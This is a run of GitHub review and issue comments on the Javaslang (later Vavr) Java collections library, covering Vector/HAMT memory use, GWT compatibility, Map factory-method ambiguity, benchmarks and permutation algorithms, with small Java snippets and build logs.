trying to run this test\njava\n    @Test\n    public void tt() {\n        Vector<Integer> vect = Stream.range(4, 1000)\n                .foldLeft(Vector.of(1, 2, 3), (v, i) -> v.append(i).tail());\n        System.out.println(vect); // expected: Vector(997, 998, 999)\n    }\nBut your implementation fails (current master works fine).\n\nWell, my goal is to check size of HAMT in resulting Vector. Current implementation shows size = 3. I guess your implementation will show size = 1000. \nLet's talk about this but not about bug that I shown above. OK, my test is a little bit synthetic and Vector can be replaced by Queue for example, but you can see the problem with memory consumption.\n. > About storing the underlying map, people can simply normalize it via ofAll(iterator()) any time, I consider it a separate memory optimization issue.\nI'm not sure that we can force the user to do the normalization. This non-obvious requirement, which looks like a limitation. My snippet code with range to Long.MAX_VALUE can runs along years and it is expected behavior, but your fails with out of memory.\nAnd another question. The complexity of all operations depends from size of HAMT, but not from size of Vector. Let's imagine code something like this:\njava\nVector<Integer> vect = Vector.range(0, 1_000_000).take(10)\nSize of Vector is 10, but size of delegated HAMT is one million. So, all operations with vector (set, get, etc.) will be strange slow.\nSorry, my opinion is that this PR should be rejected.\n. > this is the same as Array, i.e. the delegate might be bigger than it appears.\nMy fault, I have not seen this\nShould be reverted ASAP\n. > :-1: \nthis is just my opinion :)\n. > Could you please react to my response to your concern also?\nIMO previous implementation of Array was simple and fast enough for its main goals: get element and iterate along elements. All others operation should used very carefully. If someone try to get tail of Array -  OK, but it must know what he doing and must understand all about bad performance.\n. What about Vector.range(0, 1_000_000).take(500_001)?\n. > List.range(0, 1_000_000).take(550_000).toJavaList()\n\nwill have 800_000 elements internally, instead of 500_000\n\nGood catch, thank you.\nWe should use something like new ArrayList(size()) instead of new ArrayList()\n. Hi @valery1707 \nPR welcome!\nLet's name this new method Seq#removeAll(Predicate<? super T>)\nI would implement common code in javaslang.collection.Collections (see List#removeAll(T) for example)\n. sure\n. Tests slightly redundant, but OK :smile: \n. looks good, thank you!\n/cc @danieldietrich \n. Maybe we should also add Map::putOrUpdate(Tuple2) (see Map::put(Tuple2))\n. We can generate another API class, especially for GWT module. This class will override old API and will implement problem methods and classes something like this:\n``` java\npublic static abstract class Pattern2 \n    implements Pattern> {\npublic static <T, T1 extends U1, U1, T2 extends U2, U2> Pattern2<T, T1, T2> \nof(Class<? super T> type, Pattern<T1, ?> p1, Pattern<T2, ?> p2, Function<T, Tuple2<U1, U2>> unapply) {\n\n    return new Pattern2<T, T1, T2>() {\n                @Override\n                public Option<Tuple2<T1, T2>> apply(T obj) {\n                    try {\n                        final Tuple2<U1, U2> unapplied = unapply.apply(obj);\n                        return unapplied.apply((u1, u2) ->\n                                ((Pattern<U1, ?>) p1).apply(u1).flatMap(_1 ->\n                                ((Pattern<U2, ?>) p2).apply(u2).map(_2 -> (Tuple2<T1, T2>) unapplied)\n                        ));\n                    } catch (Throwable t) {\n                        return Option.none();\n                    }\n                }\n    };\n}\n\nprivate Pattern2() {\n}\n\n}\n```\nUse try {} catch () {} block is not so good, but it may work and I have no other idea.\n. Blocked by #1290 \n. GWT compiler requires sources of all dependent libraries. If someone want to use snapshot version of javaslang in his project, he should do something like this:\nxml\n<dependency>\n    <groupId>io.javaslang</groupId>\n    <artifactId>javaslang</artifactId>\n    <version>2.1.0-SNAPSHOT</version>\n</dependency>\n<dependency>\n    <groupId>io.javaslang</groupId>\n    <artifactId>javaslang</artifactId>\n    <version>2.1.0-SNAPSHOT</version>\n    <classifier>sources</classifier>\n</dependency>\n. > Or is there still work to do?\nI see the light at the end of the tunnel. \n- Need to check deployment stage. There is a problem with MANIFEST file for GWT module\n- Need move javaslang-gwt to default profile and to leave javaslang-gwt-example in GWT profile\n- Need for more tests\n. Sometimes it happens...\nI don't know what to do in this case\n. it makes sense\n. @paplorinc thank you for video.\nObjectLayout library uses java reflection and can't working without it, am I right?\nThen I have these thoughts:\n1. Our arrays in HAMT and in upcoming (?) bit-mapped vector trie are very small (size=32) and it is unclear that we will have some benefit from using this library. \n2. On other side, reflection is very slow, therefore creating inner arrays will be also very slow. This should be investigated, but I believe there will be significantly decreasing of update performance\n3. It is not main goal, of course, but we plan to make Javaslang GWT-compatible. ObjectLayout library is GWT incompatible.\n. I believe this will be not important in the future (see JEP218)\n. I think that the performance test should not be run on Travis service because it is completely useless. As Daniel said \n\nThe benchmarks should not run on a regular basis in our CI environments because subsequent benchmarks are not comparable (CI has no fixed hardware).\n\nBut on my home computer it runs 4:17 min (include 2:42 for benchmark), it is OK for me.\n. It makes sense to compare Javaslang performance with other libraries. It can be done manually with -Pbenchmark option. On Travis server it just add some lines to log with no reaction on results\n. Actually now benchmarks does nothing, just says us something about memory consumption without any results that can change CI lifecycle. I would like to return a special profile\n[INFO] ------------------------------------------------------------------------\n[INFO] Reactor Summary:\n[INFO] \n[INFO] Javaslang Parent ................................... SUCCESS [  1.314 s]\n[INFO] Javaslang Match .................................... SUCCESS [  3.305 s]\n[INFO] Javaslang .......................................... SUCCESS [02:46 min]\n[INFO] Javaslang Benchmark ................................ SUCCESS [04:35 min]\n[INFO] Javaslang Pure ..................................... SUCCESS [ 11.372 s]\n[INFO] Javaslang Test ..................................... SUCCESS [ 27.041 s]\n. also see #1024\n. > > I asked Ruslan this morning to implement a more minimal Bit Mapped Trie for comparison.\n\nI worked a lot on achieving this balance between simplicity and performance, I would rather urge @ruslansennov to review this codebase instead and suggest simplifications.\n\nI started investigate your Vector implementation. But it is EPIC change, we should review as much variants as possible. I prefer spend some time to see that your proposal is the best (hope it is!)\n. > I believe that the above two optimizations (2. and 3. above) should be treated separately, in different pull requests, and have in this pull request for just the main algorithm (described in 1. above). This way, it's easier to do review and merge: it's easier to see what's part of the core algorithm and what's an optimization, and it is easier to weigh the costs/benefits of any particular optimization.\nBravo!\n. something wrong with travis again, but all tests are passed on my computer\n. Hi @ronanM \nCould you add tests?\n. @ronanM you have to add all changed files to this PR (including changes in generated sources). These files are orphaned:\n```\nruslan@FB160424:~/proj/javaslang$ mvn test; git status\nOn branch tuple-prepend-append\nYour branch is up-to-date with 'ronan/tuple-prepend-append'.\nChanges not staged for commit:\n  (use \"git add ...\" to update what will be committed)\n  (use \"git checkout -- ...\" to discard changes in working directory)\nmodified:   javaslang/src-gen/main/java/javaslang/Tuple1.java\nmodified:   javaslang/src-gen/main/java/javaslang/Tuple2.java\nmodified:   javaslang/src-gen/main/java/javaslang/Tuple3.java\nmodified:   javaslang/src-gen/main/java/javaslang/Tuple4.java\nmodified:   javaslang/src-gen/main/java/javaslang/Tuple5.java\nmodified:   javaslang/src-gen/main/java/javaslang/Tuple6.java\nmodified:   javaslang/src-gen/main/java/javaslang/Tuple7.java\n\nno changes added to commit (use \"git add\" and/or \"git commit -a\")\n. Why `Tuple0` has no append/prepend methods?\n. @ronanM please review my PR into your repo\n. These all cooments is my fault, sorry :)\n. @danieldietrich @valery1707 \nIt seems this issue can be solved by replacing current `AbstractMultimap.iterator()` implementationjava\n@Override\npublic Iterator> iterator() {\n    return back.iterator().flatMap(t -> t._2.map(v -> Tuple.of(t._1, v)));\n}\nto modified onejava\n@Override\npublic Iterator> iterator() {\n    return back.iterator().flatMap(t -> t._2.iterator().map(v -> Tuple.of(t._1, v)));\n}\nHere `t._2.iterator()` hides container type and the comparator is no longer needed. What about memory consumption in old/new realizations?\n. >\n\nOperation  Ratio                               10    100   1000   10000\nReplace    slang_persistent/java_persistent 0.57\u00d7  0.55\u00d7  1.44\u00d7   1.39\u00d7\nSlice      slang_persistent/java_mutable    0.49\u00d7  0.58\u00d7  3.99\u00d7  34.95\u00d7\n```\ni.e. for very small Strings it's about 50% slower, for bigger ones it's a lot faster.\n- -43% and +39% for replace (the same values)\n- -51% and +3500% for slice (ooops)\n\n:smile: \nAlso I believe there is no sense in benchmarks with < 1000 elements\n. I did not want to offend you\n\nIf you have suggestions, I would appreciate them, if you're only here to mock, at least let me know what you're mocking so that I can improve it.\n\nMy suggestion is to stay CharSeq as is, without changes.\n. I do not know what else to say.\nI believe CharSeq is only needed for the expansion of the java.lang.String features to Javaslang level with all conveniences and inconveniences of java.lang.String. Nothing more. The realization of CharSeq should be plain and silly.\nIf user wants to use complex operations on characters sequence with good performance it maybe has to use a Vector\n. Closed by #1711 . > The build currently fails - the GWT module says it has no sources for Future etc. Could you take a look please? I have no idea what to do...\nThe whole package javaslang.concurrent was excluded from GWT sources because of its incompatible. So, GWT-compiler knows nothing about Future etc. All new methods that uses GWT-incompatible objects should be marked with @GwtIncompatible annotation.\nFor example, this new API method\njava\npublic static <T> Future<T> Future(CheckedSupplier<? extends T> computation) {\n    return Future.of(computation);\n}\nshould be modified:\njava\n@GwtIncompatible\npublic static <T> Future<T> Future(CheckedSupplier<? extends T> computation) {\n    return Future.of(computation);\n}\n\nDoes valery1707 need to merge with master again because we pulled in GWT support yesterday?\n\nDefinitely yes. @valery1707 sorry :)\n. IMHO as first step in Vector improvement it is enough to implement the BitMappedTrie (I guess it will be Vector.VectorTree with some modifications maybe) and just replace HAMT with BMT in current Vector implementation.\n. > would it complicate the review for you?\n\nI don't mind putting it in a separate PR :)\n\nIn ideal it will be two changed classes: new class BitMappedTrie.java and modified (with just replaced HAMT to BMT) Vector.java. Nothing complicated :)\n. > Sure, should I do them in this PR, in separate commits, or in another PR?\nI'm sorry for your wasted time, but I believe it should be in separated PR.\nFor Vector purposes BMT is obviously better choice than HAMT.\nAll other improvements are discusable, but not this one.\n@danieldietrich ?\n. > In HAMT you can put negative indices and add an offset to it later. In BMT you need to shift the whole tree by a full half tree (i.e. add another parent and pretend the whole new left side is filled with elements) and store it in an offset so that only the actual nodes are accessed.\nIt's not such a huge change like #1449 or this PR.\nAnd main goal: this change can be compact and observable\n. > In BMT you need to shift the whole tree by a full half tree (i.e. add another parent and pretend the whole new left side is filled with elements) and store it in an offset so that only the actual nodes are accessed.\nSorry, maybe I don't understand something, but why this logic can't be moved to BMT?\n. Thanks, @paplorinc \nOn first sight I haven't anymore significant comments on this PR.\n@danieldietrich your move!\n. Sorry guys, I can't take part in discussion, too busy until Monday.\nI'll review this PR later (if it will be actual)\n. Hi @paplorinc \nRight now I can't help you because I'm very busy until Sunday evening.\nMost GWT-related problems can be solved by removing (or marking by @GwtIncompatible annotation) all reflection stuff like isAssignable method etc\n. Now I see that error log shows not enough info\n[INFO] java.lang.ClassCastException\n[INFO]  at java.lang.Throwable.Throwable(Throwable.java:61)\n[INFO]  at java.lang.Exception.Exception(Exception.java:25)\n[INFO]  at java.lang.RuntimeException.RuntimeException(RuntimeException.java:25)\n[INFO]  at java.lang.ClassCastException.ClassCastException(ClassCastException.java:23)\n[INFO]  at javaemul.internal.InternalPreconditions.checkCriticalType(InternalPreconditions.java:141)\n[INFO]  at com.google.gwt.lang.Cast.castTo(InternalPreconditions.java:129)\n[INFO]  at client.CollectionsTestGwt$6methodref$ofAll$Type.$apply(Character.java:485)\n[INFO]  at client.CollectionsTestGwt.testCompileVector(CollectionsTestGwt.java:23)\n[INFO]  at Unknown.anonymous(GWTTestMetadataImpl.java:14)\n\nI can't run the GWT tests locally\n\nWhy? Just run mvn test and you will see results of JDK tests and GWT tests\n. Javaslang's Array specialization is only fast access and iteration along its elements (not update as you say). It seems upcoming Vector is fast enough to remove Array away.\n. It seems we should return Tuple2 as result of computeIfPresent / computeIfAbsent methods. Here is one of possible signature\n``` java\n/\n * If the specified key is not already associated with a value,\n * attempts to compute its value using the given mapping\n * function and enters it into this map.\n \n * @param key key whose presence in this map is to be tested\n * @param mappingFunction mapping function\n * @return the {@link Tuple2} of current or modified map and existing or computed value associated with the specified key\n /\nTuple2, V> computeIfAbsent(K key, Function<? super K, ? extends V> mappingFunction);\n/\n * If the value for the specified key is present, attempts to\n * compute a new mapping given the key and its current mapped value.\n \n * @param key key whose presence in this map is to be tested\n * @param remappingFunction remapping function\n * @return the {@link Tuple2} of current or modified map and the {@code Some} of the value associated \n * with the specified key, or {@code None} if none\n /\nTuple2, Option> computeIfPresent(K key, BiFunction<? super K, ? super V, ? extends V> remappingFunction);\n``\n. Thanks for comments, updated\n. First of all, I would keepGwtIncompatibleannotations as is, i.e. included injavaslang-coreas copy in every package. I believe thatprovidedscope can be used in case if we will mergejavaslang-coreandjavaslang-gwtmodules in the future (it makes sense because alljavaslang-gwt` staff is quite small and can't broke main functionality)\n\nI prepare 2.1.0. What is your suggestion regarding the target version for the GWT module? I think it can be included in 2.1.0 but we should communicate the GWT support as experimental to get first feedback. What do you think? Or are there still errors that prevent a valid GWT use-case?\n\nGWT support is not ready now. The Javaslang code is still not tested in GWT-mode and have a lot possibilities to fail. Also Javaslang is strongly Java8-oriented and we can find more bugs in GWT (see fixed bug). We should move this issue to 3.0.0\n. > do you know/remember with which PR we fixed it?\nsorry :smile: \n. > @ruslansennov that might be also a problem of HAMT\nNo, it was solved #1818. mvn install also runs tests and benchmarks.\nFor your purposes mvn generate-sources is enough\n. Travis knows nothing about google snapshots.\nIt seems we will wait for rc3\n. @danieldietrich rc3 released, all tests passed\n. Can you pull this right now? To avoid GWT-incompatible commits in future\n. See last build log :) Now gwt-tests executes on every building.\n. done\n. I'll try to implement this next week\n. Let's take this code:\njava\nfinal TreeMap<String, Integer> tm = TreeMap.of(Tuple.of(\"one\", 1), Tuple.of(\"two\", 2));\nCompilation fails with\nError: reference to of is ambiguous\n  both method \n<K,V>of(javaslang.Tuple2<? extends K,? extends V>,javaslang.Tuple2<? extends K,? extends V>) \nin javaslang.collection.TreeMap and method \n<K,V>of(K,V) in javaslang.collection.TreeMap match\nThe problem can be solved something like this:\njava\nfinal TreeMap<String, Integer> tm = \n    TreeMap.<String, Integer>of(Tuple.of(\"one\", 1), Tuple.of(\"two\", 2));\nbut it is inconvenient.\nLet's keep Map*::ofEntries(Tuple2, Tuple2) instead of Map*::of(Tuple2, Tuple2)\nSame for Map*::ofEntries(Entry, Entry)\n. I'm trying to make API methods for Map*::ofEntries(Tuple2, Tuple2), but here we have same problem...\njava\nMap<Integer, Integer> map = SortedMap(Tuple.of(1, 2), Tuple.of(2, 4));\nfails with\n[ERROR] /home/ruslan/proj/javaslang/javaslang/src-gen/test/java/javaslang/APITest.java:[1178,35] reference to SortedMap is ambiguous\n  both method <K,V>SortedMap(javaslang.Tuple2<? extends K,? extends V>,javaslang.Tuple2<? extends K,? extends V>) in javaslang.API and method <K,V>SortedMap(K,V) in javaslang.API match\nWe can change name of methods (to SortedMapFromEntries for example), but I don't like this idea.\n. We can leave <exclude name=\"concurrent/**\"/> entry in Javaslang.gwt.xml, but implement lightweight version of Promise and Future Javaslang's classes in GWT super-source folder. If you have played with it, could you try do this?\n. @dharezlak still something wrong... I'll try to run tests on my computer later\n. @dharezlak magic!\nCould you explain why tests passed only with suite?\n. @danieldietrich LGTM\nAs I see, nothing changed in javaslang core and GWT-compiler happy to see javaslang.concurrent.Future. After pulling this we should remove most of GwtIncompatible annotations from API.*future* methods /cc @valery1707 \n. > Generally we should not include 3rd party framework specific stuff into the javaslang core module. Here we added super-sources. Why can't those reside within the javaslang-gwt module?\nI believe this is kind of taste. Super-sources is just resource text files and I'm not sure that we should create artifact for this\n\nCopying the Javaslang sources to a super-sources folder is no good idea. It leads to maintenance hell. The original sources and the super-sources will diverge over time.\n\nOur super-sources contains only JDK classes which not included in GWT emulation core.\n\nIncluding the JDK sources is not a good idea. Who is keeping them actual? It is bound to a specific JDK version. Javaslang will run on multiple JDK versions. We can't include every version of a JDK file at the same time.\n\nIt's only possibility to make Javaslang compilable. And as I know this is common solution for these cases. If javaslang.concurrent.Future depends from JDK executor, GWT-compiler trying to find in own emulation library and can not find it. We must give it. Our emulated executor in super-sources can be modified/simplified from JDK, but it should be\n\nIncluding sources that are used by current impls (like FutureImpl -> AtomicInteger) is also not a good idea. When changing FutureImpl, some dependencies might be obsolete. \n\nWe will change our super-sources. Tests can tell us that something wrong\n\nZombies (like AtomicInteger in this example) will reside in our code-base.\n\nOooops :)\n. >  try to resolve potential guava conflicts for projects using both guava and javaslang-gwt (e.g. through providing different GWT descriptor files).\nThis is bonus task :)\n\nWill these give us a green light towards 2.1.0 release?\n\nI think so\n. > What should we do with the now removed JavaslangExample module?\nI believe we should keep it. Maybe in own, non-deployable maven module \"GWT-Example\". Few commits ago I removed it :( But you can find it :)\nThank you so much for your contribution!\n. reproduced: \n[WARNING] /home/travis/build/javaslang/javaslang/javaslang/src/main/java/javaslang/collection/TreeMap.java:[151,40] \n<K,V>of(java.util.Comparator<? super K>,java.lang.Object...) in javaslang.collection.TreeMap is potentially ambiguous with \n<K,V>of(java.util.Comparator<? super K>,K,V,K,V,K,V,K,V,K,V,K,V,K,V,K,V,K,V,K,V) in javaslang.collection.TreeMap\n. > remove the deprecated method(s) and break compatibility --> Maybe this :-/\nmaybe there is only one possibility\n. > If we break, then the right way.\nOK, now all is clear for me.\nI'll do the same for of(Entry...), of(Tuple2...) and for all methods in all multimaps\n. Yes, removing all factory methods with Object... argument and replacing with KVKV\n. @danieldietrich please leave this PR unmerged for a while \n. > ```\n\npublic static  LinkedHashMap ofEntries(Tuple2<? extends K, ? extends V> e1, Tuple2<? extends K, ? extends V> e2, Tuple2<? extends K, ? extends V> e3, Tuple2<? extends K, ? extends V> e4, Tuple2<? extends K, ? extends V> e5, Tuple2<? extends K, ? extends V> e6, Tuple2<? extends K, ? extends V> e7, Tuple2<? extends K, ? extends V> e8) {\n    final HashMap map = HashMap.ofEntries(e1, e2, e3, e4, e5, e6, e7, e8);\n    final Queue> list = Queue.of((Tuple2) e1, (Tuple2) e2, (Tuple2) e3, (Tuple2) e4, (Tuple2) e5, (Tuple2) e6, (Tuple2) e7, (Tuple2) e8);\n```\nhmm, these casts are ugly, but I could't come up with a better solution (except for chaining the methods, as I suggested earlier ... @ruslansennov, could you please react to that?)\n\n@paplorinc  Can't find your comment directly (do you removed it?)\n@danieldietrich proposed to remove this methods, let's wait his comment\n. Sorry guys\nI'm totally confused. I have to close this PR and open new #1664 with Map.of(KVKVKV) only.\n. > @ruslansennov, what' the source of confusion?\nHuge PR, a lot of comments, different opinions about ofEntries(Tuple/Entry/KV)...\nI prefer small PRs which is more observable (this is only my personally sight)\n. > The method printf(String, Object[]) is undefined for the type PrintStream\nThis is true. Here is GWT super-source of PrintStream. No printf* methods emulation\n. this is an obvious error\njava\n@Override\npublic Seq<V> values() {\n    return map.values();\n}\n. Could you make measurements with another implementation of traverse (Daniel pointed at it in issue comments) when we use List.prepend() on every element and List.reverse() at the end?\nVector is awesome structure, but it requires more memory than List\n. @danieldietrich this code has complexity O(n)\njava\nList<U> result = foldLeft(List.empty(), (acc, entry) -> acc.prepend(mapper.apply(entry._1, entry._2)));\nreturn result.reverse();\nAnd @mduesterhoeft shows similar results.\nBut OK\n. @danieldietrich There is no changes needed, these methods compiles fine:\n```java\n    > Multimap iss1694_1() {\n        return HashMultimap.withSortedSet().empty();\n    }\n<T extends Comparable<T>> Collector<Tuple2<Integer, T>, ArrayList<Tuple2<Integer, T>>, ? extends Multimap<Integer, T>> iss1694_2() {\n    return HashMultimap.withSortedSet().collector();\n}\n\n<T1, T2 extends Comparable<T2>> Multimap<T1, T2> iss1694_1() {\n    return LinkedHashMultimap.withSortedSet().empty();\n}\n\n<T extends Comparable<T>> Collector<Tuple2<Integer, T>, ArrayList<Tuple2<Integer, T>>, ? extends Multimap<Integer, T>> iss1694_2() {\n    return LinkedHashMultimap.withSortedSet().collector();\n}\n\n<T1 extends Comparable<T1>, T2 extends Comparable<T2>> Multimap<T1, T2> iss1694_1() {\n    return TreeMultimap.withSortedSet().empty();\n}\n\n<T extends Comparable<T>> Collector<Tuple2<Integer, T>, ArrayList<Tuple2<Integer, T>>, ? extends Multimap<Integer, T>> iss1694_2() {\n    return TreeMultimap.withSortedSet().collector();\n}\n\n```\nYou must declare the value type as comparable, but not the type of key.. /cc @dharezlak \nI'm afraid that this is a big mistake.\n\nThese two modules do not belong to the javaslang core. GWT is a framework on its own, like Jackson (which has the javaslang-jackson module).\n\nThe Jackson module requires API stability only, but requirements of GWT module is more strong: it requires GWT-compatibility of internal core code. Each step can bring core into the state of inconsistency with GWT. \n\nAdditionally we have build problems because the gwt modules are currently build along with the other modules but they depend on deployed sources-jars of javaslang-core. This is a chicken-egg problem.\n\nYes, this is a known problem of Maven. But everything will be OK when we migrate to Gradle.\n\nThe actual builds fail because of this cyclic dependency, even locally. I had to remove the gwt modules from the parent pom (locacally/temporarily).\n\nMy favorite command mvn clean test -pl \\!javaslang-benchmark works well. What do you mean?\n. > What we really need is to trigger the javaslang-gwt build after the javaslang core build ran successful.\nYes, this is good point. I don't know if this is possible on Travis, but it definitely possible on Cloudbees. Someone (I dont remember exactly) asked for public visibility. > you (I think) :)\nNO!!! :smile: \n\nCurrently we use AbstractIterator only in the javaslang.collection package. Iterator itself is used almost everywhere but it is instantiated by using the factory methods. I think it could be made package private. Let users write Iterators how they are used to write them!\n\nI agree with you. Daniel, I'm ready to begin, but I'm not sure that we should do this because now we have new groupId, artifactId and artifactVersion :). fixed by #1831. No prob :). see #1968 #1975 . @orionll nice catch, thank you. Sh*t...\nYou're right, thank you. fixed #1823  . > I will consider this change for the next major release 3.0.0.\nyeaaaah. >  could you please help us in identifying why these lines aren't covered?\nNeed more tests :)\nThank you, this evening I'll try to reach 100% in HAMT. @danieldietrich , I agree with @yuriykulikov \nCurrently there is no way to keep order when existing key/value pair replaced. I believe LHM should do it, then both behavior will be possible. Yep. ~It seems we should do nothing except put new key/value pair into map~. >  get and the find operations (which are O(n))\nNo, both are O(1) because of underlying HashMap. We should wait for any news from @paplorinc \nHe promised to check out gwt building. We can't change LinkedHashMap::keys signature as you proposed, because it will clash with method in super interface. However we could change it to something like this\njava\n    @Override\n    public Set<K> keySet() {\n        return new LinkedHashSet(this);\n    }\nThis would keep order of elements. > That's why I suggested adding keys() rather than changing keySet()\nOh, sorry :)\n\nTo do that, though, wouldn't you also need to change the LinkedHashSet constructor to take a LinkedHashMap<T, Object> rather than a LinkedHashMap<T, T>?\n\nYes, wrapped map should be changed to \njava\nprivate final LinkedHashMap<T, Object> map;\n. java.util.LinkedHashMap.keySet() also keeps order. @danieldietrich done. \n. Please see #1852 #1636 and http://blog.javaslang.io/the-agonizing-death-of-an-astronaut/. I believe this is wrong way (for PriorityQueue at least). Someone may want to create instance based on another one with new comparator. We can do it like in TreeSet\njava\nif (values instanceof TreeSet && ((TreeSet) values).comparator() == comparator) {\n    return (TreeSet<T>) values;\n} else {\n    // ...\n}. @danieldietrich or we can just mark keyComparator() as deprecated? I bow to that decision. sure. @nfekete, thank you I confirm the problem. This test passes in GWT and of course fails in Java\njava\n// GWT scope\npublic void testTabulate() {\n    Vector<?> v = Vector.tabulate(2, Function.identity());\n    // actually v is not {0, 1} but is {{0, 1}}\n    assertTrue(v.size() == 1);  // true in GWT, false in Java\n    Object[] head = (Object[]) v.get(0);\n    assertEquals(head[1], 1);\n}. Daniel, you're right, JavaScript is funny... \nWe can change signature of internal Collections.tabulate(...) from\njava\nC tabulate(int n, Function<? super Integer, ? extends T> f, C empty, Function<T[], C> of)\nto something like\njava\nC tabulate(int n, Function<? super Integer, ? extends T> f, C empty, Function<java.util.List<T>, C> of)\nand this solves the problem.\n. ... and we should check all other factory methods in GWT. This blocks javaslang-gwt release. I'm not sure we should fix javaslang internals or should wait for next version of GWT, but I would reopen this issue for a while. \"The fix should be straightforward\" - good news :). @danieldietrich Why FunctionN is deprecated?\nI found issue #1493 about CheckedFunctionN but not about FunctionN. sorry, it is SuppressWarnings but not Deprecated...\nI'm a little tired. GWT is OK, but jackson fails :)\nwill fix it this evening. Hi guys.\nI believe it will be very interesting experiment. I will try to suggest cons-benchmark when prototype will be ready.. (hope I can) :smile: . Javaslang inspired by Scala...\nscala\nvar hm = mutable.HashSet(1, 2, 3, 1, 2)\nvar lhm = mutable.LinkedHashSet(3, 1, 2, 3, 1, 1, 1)\nprint(hm.equals(lhm))   // true. Hi @paplorinc \nSorry, I can't say anything... \nI'm not familiar with jsweet and with TypeScript, but your link looks very interesting. duplicate #1773. bye-bye. towards #1886. This PR (and issue) is very problemastic. It's OK for me to keep all things as is. I'm offline now, please close both.. @tbroyer thank you. initial PR: #1325\nreverted (not completely) by: #1373 . > did the implementation of the following methods change?\nI'll check all methods\n\nBtw - the following part <...> could be optimized by <...>\n\nsure :). > So if the result of permutation is correct, it is indeed much faster in this PR.\nIt is correct, I checked this, trust me :)\nThank you for measurements. > There are some instances created otherwise, even if the Array is empty\nOK, your're right! I'll do it this evening. I added test for permutation of repeated elements and it seems that lexicographic order (both: S-T-J and Narayana) is bad choice in our case. These algorithms do not take into account repeating of elements and produce result different from other Vavr collections (as well as Scala collections) because they operate with indexes but not with elements. For example:\n```java\na1 = [1, 1]\nNarayana permutations: [[1,1], [1,1]]\nNarayana permutations of distinct elements: [[1]]\nOther Vavr collections and Scala: [[1,1]]\na2 = [1, 2, 2]\nNarayana permutations: [[1, 2, 2], [1, 2, 2], [2, 1, 2], [2, 2, 1], [2, 1, 2], [2, 2, 1]]\nNarayana permutations of distinct elements: [[1, 2], [2, 1]]\nOther Vavr collections and Scala: [[1, 2, 2], [2, 1, 2], [2, 2, 1]]\n``\nSo sad, but I don't see any solution of this problem and we should revert all changes to very first algorithm (v.2.0.6). It will be not so fast, but right in all cases. Or, we can returnNarayana.distinct()sequence as result of permutations, but this will be very slow for bigN`. > The main issue is that ConcatIterator keeps an inefficient structure for the iteration when nesting ConcatIterators.\nDo you have any thoughts about this?. caching hasNext boolean values reduces complexity from exponential to something like linear\nTarget             Operation   Impl                  Params  Count            Score  \u00b1     Error    Unit  scala_persistent  vavr_persistent\nIteratorBenchmark  Concat      scala_persistent          10      5     2,583,938.92  \u00b1     6.51%   ops/s                            14.02\u00d7\nIteratorBenchmark  Concat      scala_persistent          20      5     1,444,009.89  \u00b1     7.05%   ops/s                            20.48\u00d7\nIteratorBenchmark  Concat      vavr_persistent           10      5       184,253.30  \u00b1    12.01%   ops/s            0.07\u00d7                 \nIteratorBenchmark  Concat      vavr_persistent           20      5        70,522.63  \u00b1     1.46%   ops/s            0.05\u00d7\nBut this is not enough :smile: . > Or if it's okay, I can add the scala port to the PR.\nThank you! The only problem is the licensing of the Scala code. I also (as you) do not know the details, maybe we need to ask someone from the Scala developers\n\nOh, and BTW, is this necessary: AbstractIterator.java#L31-L33?\n\nYes, this is an common code that should inform users about the case of an empty iterator with appropriate message. I don't see any problem here because the hasNext() method must be fast (at least for the second and all next calls) in each iterator implementation.. Also we have very bad performance at least for Stream and List because of get() complexity is O(N)\n1749 should be reviewed again. > Though, I am not sure how one can improve the complexity?\nCurrent algorithm is O(N^2) for Stream and List, so we can't use Collections.dropUntil in these cases and it seems we should roll back the changes. > [Queue|List|Stream].drop[While|Until]\n[Queue|List|Stream].dropRightUntil\nthese tests already exist, see AbstractTraversableTest. It seems that the problem code is FutureImpl.java#L199. Computation fails in Try block with InterruptedException which is fatal according to Try.java#L1493. \nI believe we should use classic try {} catch () {} block here.\nSee #1976. And maybe actions.forEach(this::perform) should be here. see #1963. Need to do more tests.... Hi @ahlusar1989 \nThis issue belongs to vavr-io/vavr-docs project. Could you provide a PR to fix it?. A little bit tricky, but it compiles and works fine:\njava\npublic static <T extends Temporal> T to1(Date date, Class<T> to) {\n    ZoneId defaultZoneId = ZoneId.systemDefault();\n    return (T) API.<Object>Match(to).of(\n            Case($(is(LocalDate.class)), t -> date.toInstant().atZone(defaultZoneId).toLocalDate()),\n            Case($(is(LocalTime.class)), t -> date.toInstant().atZone(defaultZoneId).toLocalTime()),\n            Case($(is(LocalDateTime.class)), t -> date.toInstant().atZone(defaultZoneId).toLocalDateTime())\n    );\n}. Hi @hamnis \nThis is obvious method, but could you add tests for him?. @danieldietrich it seems that using other collection doesn't break backward compability. @chronodm thanks for report. > only the keys are compared\nIn the worst case we need to define two comparators. For example:\n\nHashMap[Set] - no comparators required\nLinkedHashMap[SortedSet] - it is necessary to determine values comparator\nTreeMap[Seq] - it is necessary to determine keys comparator\nTreeMap[SortedSet] - it is necessary to determine both comparators\n. Sorry. There was no profit in case of Array.fill (which I discovered), but we should be more accurate in other cases (like List for example). Good catch!\nI believe we should keep memoization in sortBy methods but change hashCode calculation algorithm for Stream. For example, we can use first N elements only.. > I may have already answered myself with HashSet.distinctBy(Function<? super T> keyExtractor)\n\nIf I understood you correctly, it will not help you. For your use case you should use wrapper class which holds the object and the hashing function. Or you can overwrite hashCode method in your object.\nIt is possible to add requested functionality to HashSet and HashMap, but I'm not sure this would be seriously useful as you said... @danieldietrich ?. thank you. thank you. iterate(Supplier<Boolean> hasNext, Supplier<? extends T> next) requires synchronized common state of both suppliers. In fact, one should implement Supplier<Option> factory and pass it to Iterator.iterate(Supplier, Supplier). I believe Iterator.iterate(Supplier<Option>) is enough.\n. thank you. I also don't see any problems. By default all json objects maps to java.util.LinkedHashMap. Try this:\njava\nList<Map<String, String>> results = mapper.readValue(inputfile, \n    new TypeReference<List<Map<String, String>>>() {});. > Map[] results = mapper.readValue(inputfile, Map[].class);\ninteresting :smile: \n\nit is possible to have it ask vavr for a Map-like thing? Then Vavr's type could be supplied.\n\nI'm not sure I understand your question. When a jackson deserializes json object, it must know which class it should use to return. If the class is not specified, it uses a java.util.LinkedHashMap. As I know, you can specify a custom class in three ways: through a .class object in readValue method, through a TypeReference (for generics specify) or if it is a field of another outer class (bean). This scenario has nothing to do with the vavr-jackson module. Simply if you specify a vavr collection as a object of deserialization and do not register a module, you will get an error.\nHowever, Jackson is a huge library, maybe I do not know something. Thanks.\nAlready done, see #2102. In your case the second parameter of Try::recover call is Function<MyAppRuntimeException, Void>. Try this:\njava\nTry.run(() -> sayHello())\n        .recover(MyAppRuntimeException.class, ex -> {\n            System.out.println(ex.getMessage());\n            return null;\n        });. 